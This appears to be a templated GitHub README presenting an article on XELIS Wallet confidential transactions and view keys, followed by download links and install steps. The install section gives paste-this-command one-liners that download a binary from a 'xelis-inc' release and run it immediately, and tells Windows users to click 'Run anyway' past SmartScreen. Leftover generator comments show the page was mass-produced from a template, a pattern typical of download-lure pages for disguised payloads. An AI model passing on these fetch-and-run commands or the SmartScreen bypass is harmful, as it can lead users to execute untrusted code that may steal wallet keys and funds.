![XELIS Wallet and confidential transactions](assets/banner-article.png)
# XELIS Wallet and confidential transactions

Why amounts are hidden, what a view key reveals and who can read what.

## Downloads - Privacy

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> Hidden amounts are not hidden activity: the transaction itself, its participants and its timing remain visible.

XELIS encrypts transaction amounts and balances with homomorphic encryption, so the chain can verify transfers without publishing the values. Your keys decrypt what is yours; an observer sees that a transaction happened and what fee was paid, not how much moved.

<!-- ARTICLE-BODY-BEGIN -->
## The problem confidential transactions solve

A normal public chain publishes the amount of every transfer. That is enough to reconstruct balances and spending patterns even without names attached. Confidential transactions keep the arithmetic verifiable while removing the numbers from public view.

XELIS does this with homomorphic encryption: values stay encrypted, and the network can still check that inputs and outputs balance. The result is a chain where the ledger is public and the amounts are not.

## How it works inside the wallet

When you send from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>, the amount is encrypted and the transaction carries the encrypted values plus the proof that they are consistent. Your wallet holds the keys that can decrypt your side of the ledger, which is why your balance is readable to you and to nobody else.

Balances work the same way. The wallet decrypts the balance for the addresses it controls and shows a number; an observer reading the chain sees an encrypted figure.

## What a view key is for

A view key lets a holder reveal the amounts and history of their own addresses to someone else without handing over spending authority. It is the mechanism behind disclosure for an audit, a dispute or a tax conversation: the recipient of the view key can confirm values, but cannot move funds.

Treat a view key as sensitive. It reveals your financial history to whoever holds it, and it cannot be un-shared once it has been used.

## What this does and does not hide

| Element | Visible to an observer |
| --- | --- |
| Transaction exists | Yes |
| Sender and recipient addresses | Yes |
| Amount transferred | No |
| Wallet balance | No |
| Fee | Yes |

That last row is why the fee article exists as a separate subject; the fee is one of the few numbers a confidential transaction still exposes. <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-fees-too-low.md">How XELIS Wallet fees work</a> covers what that number does.

## The limits belong in the same breath

Confidential amounts do not make you anonymous. Linking an address to a person can happen through an exchange withdrawal, a public post or network metadata, and once linked, the encrypted amounts still hide the values but not the relationship. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-privacy-what-it-hides.md">XELIS Wallet privacy limits</a> sets out that boundary honestly.

If you want to know how the same encrypted state is used by contracts, <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-smart-contracts-xvm.md">XELIS smart contracts on the XVM</a> covers confidential computation at a level a wallet holder needs.

## FAQ
### How do confidential transactions work in XELIS Wallet?
Amounts and balances are encrypted with homomorphic encryption; the network verifies consistency without seeing the values, and your keys decrypt your side.

### What is a view key in XELIS Wallet?
A key that reveals your amounts and history without allowing spending. Share it only with someone who needs to verify your records.

### Does XELIS Wallet hide my balance from other people?
Yes, the balance is encrypted on chain. Someone who knows your address can see that it transacted, not how much it holds.

### Can I prove a payment without revealing everything?
A view key is the tool for that: it discloses the values for the addresses you choose, not the whole wallet.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet privacy limits](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-privacy-what-it-hides.md)
- [XELIS Wallet fee behaviour](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-fees-too-low.md)
- [XELIS smart contracts on the XVM](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-smart-contracts-xvm.md)
- [Receive XEL in XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-receive-address-qr-code.md)
